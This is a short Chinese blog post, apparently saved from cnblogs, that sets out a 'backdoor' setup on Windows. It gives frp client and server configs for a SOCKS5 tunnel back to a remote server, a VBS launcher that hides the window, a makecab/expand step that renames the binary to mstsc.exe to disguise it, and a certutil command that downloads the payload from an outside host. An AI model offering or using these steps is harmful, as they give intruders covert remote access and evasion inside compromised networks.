\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[www.cnblogs.com\](https://www.cnblogs.com/-mo-/p/12539341.html)

后门文件配置：

```
#frpc.ini
\[common\]
server\_addr = \*.\*.\*.\*
server\_port = 7000
token = 123456

\[socks\_proxy\]
type = tcp
remote\_port =8888
plugin = socks5


```

```
#frps.ini
\[common\]
bind\_addr =0.0.0.0
bind\_port =7000
token = 123456


```

```
#frpc.bat
frpc.exe -c frpc.ini

#frpc.vbs
Set ws = CreateObject("Wscript.Shell")
ws.run "cmd /c frpc.bat",vbhide


```

压缩解压:  
减少文件体积，提高文件上传速度，这里为了方便直接可以使用 windows 自带的压缩解压工具:

```
#压缩
makecab frpc.exe frpc.txt

#解压
expand C:\\Users\\RabbitMask\\Desktop\\test\\frpc.txt C:\\Users\\RabbitMask\\Desktop\\test\\mstsc.exe


```

远程下载:

```
certutil -urlcache -split -f http://192.168.1.1/frpc.txt  1.txt


```